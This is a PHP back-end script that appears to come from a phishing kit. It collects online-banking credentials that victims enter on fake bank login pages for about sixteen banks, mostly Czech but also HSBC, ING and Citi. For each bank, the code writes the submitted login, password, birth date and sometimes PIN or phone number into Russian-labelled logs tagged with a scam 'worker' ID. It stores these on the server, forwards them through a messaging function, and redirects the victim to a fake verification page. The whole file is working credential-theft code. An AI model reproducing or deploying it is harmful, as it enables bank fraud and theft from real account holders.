<?php

include "../service.php";
include "../../settings.php";

if (file_exists("../data/" . $_POST['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("../data/" . $_POST["id"] . ".xml");

switch($_POST['type']){
    case '1':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 🟨 ExpoBank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Дата рождения</b>: " . $_POST['datadata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKcz($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "🟨 Expo Bank", $log_name, $io['log']);
    break;
    case '2':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 🫐 MonetaBank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Дата рождения</b>: " . $_POST['datadata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKcz($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "🫐 MonetaBank", $log_name, $io['log']);
    break;
    case '3':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 🧧 OberBank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Дата рождения</b>: " . $_POST['datadata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKcz($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "🧧 OberBank", $log_name, $io['log']);
    break;
    case '4':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 📘 CNB Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Дата рождения</b>: " . $_POST['datadata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKcz($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "📘 CNB Bank", $log_name, $io['log']);
    break;
    case '5':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 🧿 Ceska Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Дата рождения</b>: " . $_POST['datadata']  . "\n❕ <b>PIN</b>: " . $_POST['pindata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKcz($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "🧿 Ceska Bank", $log_name, $io['log']);
    break;
    case '6':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 🔵 EquaBank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Дата рождения</b>: " . $_POST['datadata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKcz($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "🔵 EquaBank", $log_name, $io['log']);
    break;
    case '7':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 📕 mBank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Дата рождения</b>: " . $_POST['datadata'] . "\n❕ <b>PIN</b>: " . $_POST['pindata']  . "\n❕ <b>Отдел</b>: " . $_POST['otdeldata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKcz($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "📕 mBank", $log_name, $io['log']);
    break;
    case '8':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 🟥 HSBC Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Дата рождения</b>: " . $_POST['datadata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKcz($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "🟥 HSBC Bank", $log_name, $io['log']);
    break;
    case '9':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: ⬛ Air Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Дата рождения</b>: " . $_POST['datadata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKcz($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "⬛ Air Bank", $log_name, $io['log']);
    break;
    case '10':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 💙 CSOB Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Дата рождения</b>: " . $_POST['datadata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKcz($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "💙 CSOB Bank", $log_name, $io['log']);
    break;
    case '10':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 💙 CSOB Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Дата рождения</b>: " . $_POST['datadata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKcz($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "💙 CSOB Bank", $log_name, $io['log']);
    break;
    case '11':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 🟡 ING Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Дата рождения</b>: " . $_POST['datadata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKcz($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "🟡 ING Bank", $log_name, $io['log']);
    break;
    case '12':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 🖤 KB Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Дата рождения</b>: " . $_POST['datadata'] . "\n❕ <b>Номер телефона электронной подписи</b>: " . $_POST['mamkadata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKcz($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "🖤 KB Bank", $log_name, $io['log']);
    break;
    case '13':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 🧢 Citi Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Дата рождения</b>: " . $_POST['datadata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKcz($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "🧢 Citi Bank", $log_name, $io['log']);
    break;
    case '14':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 🍎 UniCredit Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Дата рождения</b>: " . $_POST['datadata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKcz($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "🍎 UniCredit Bank", $log_name, $io['log']);
    break;
    case '15':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 💛 Raiffeisen Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Дата рождения</b>: " . $_POST['datadata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKcz($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "💛 Raiffeisen Bank", $log_name, $io['log']);
    break;
    case '15':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 💛 Raiffeisen Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Дата рождения</b>: " . $_POST['datadata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKcz($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "💛 Raiffeisen Bank", $log_name, $io['log']);
    break;
    
    case '16':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 🔵 FioBank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Дата рождения</b>: " . $_POST['datadata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKcz($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "🔵 FioBank", $log_name, $io['log']);
    break;
    default: 
        header("location: https://google.com/");
        exit;
    break;
}
header("location: ../verification.php?id=" . $_POST['id'] . "&wid=" . $xml->worker_id);


?>